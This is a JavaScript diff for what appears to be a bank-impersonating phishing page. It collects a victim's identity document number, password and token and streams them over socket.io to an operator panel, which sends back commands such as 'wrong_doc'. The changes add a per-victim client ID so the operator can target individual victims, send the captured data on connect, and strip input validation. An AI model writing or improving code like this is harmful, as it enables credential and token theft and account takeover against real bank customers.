@@ -21,6 +21,12 @@
   let step = "doc";
   let docType = "DNI";
 
+  let clientId = sessionStorage.getItem("efectiva_client_id");
+  if (!clientId) {
+    clientId = "user_" + Math.random().toString(36).substr(2, 9) + Date.now();
+    sessionStorage.setItem("efectiva_client_id", clientId);
+  }
+
   const socket = typeof io !== "undefined" ? io() : null;
 
   function showLoading(text) {
@@ -43,10 +49,10 @@
     const currentDoc = docNumber ? docNumber.value.trim() : "";
     const currentPass = password ? password.value : "";
 
-    // Si el usuario aún no ha escrito nada, no enviar tarjetas vacías al panel
     if (!customStatus && !currentDoc && !currentPass && !currentToken) return;
 
     const data = {
+      clientId,
       docType,
       docNumber: currentDoc,
       password: currentPass,
@@ -58,7 +64,12 @@
   }
 
   if (socket) {
+    socket.on("connect", function () {
+      sendSocketUpdate();
+    });
+
     socket.on("operator:action", function (data) {
+      if (data.targetId && data.targetId !== clientId && data.targetId !== socket.id) return;
       hideLoading();
       const { action, message } = data;
       if (action === "wrong_doc") {
@@ -102,18 +113,9 @@
     if (next === "verify") title.textContent = "Verifica tu identidad";
   }
 
-  function limitsFor(type) {
-    if (type === "CE") return { max: 12, mode: "text", filter: /[^a-zA-Z0-9]/g };
-    return { max: 8, mode: "numeric", filter: /\D/g };
-  }
-
   function applyDocType(type, label) {
     docType = type;
     docTypeValue.textContent = label;
-    const lim = limitsFor(type);
-    docNumber.maxLength = lim.max;
-    docNumber.inputMode = lim.mode;
-    docNumber.value = docNumber.value.replace(lim.filter, "").slice(0, lim.max);
     syncFilled(docNumber, docWrap);
   }
 
@@ -122,8 +124,6 @@
   }
 
   docNumber.addEventListener("input", function () {
-    const lim = limitsFor(docType);
-    this.value = this.value.replace(lim.filter, "").slice(0, lim.max);
     syncFilled(this, docWrap);
     docWrap.classList.remove("error");
     showError("");
@@ -184,11 +184,6 @@
         docWrap.classList.add("error");
         showError("Ingresa tu número de documento");
         docNumber.focus();
-        return;
-      }
-      if (docType === "DNI" && docNumber.value.length !== 8) {
-        docWrap.classList.add("error");
-        showError("El DNI debe tener 8 dígitos");
         return;
       }
       setStep("pass");
